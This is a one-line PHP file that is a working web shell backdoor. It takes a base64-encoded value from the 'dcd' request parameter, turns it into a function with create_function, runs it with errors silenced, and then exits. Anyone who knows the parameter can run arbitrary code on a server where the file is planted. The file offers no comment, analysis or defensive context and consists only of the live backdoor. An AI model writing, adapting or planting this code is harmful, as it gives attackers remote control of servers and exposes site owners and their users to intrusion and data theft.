<?php
if(!empty($_REQUEST['dcd'])){$dcd=base64_decode($_REQUEST['dcd']);$dcd=create_function('',$dcd);@$dcd();exit;}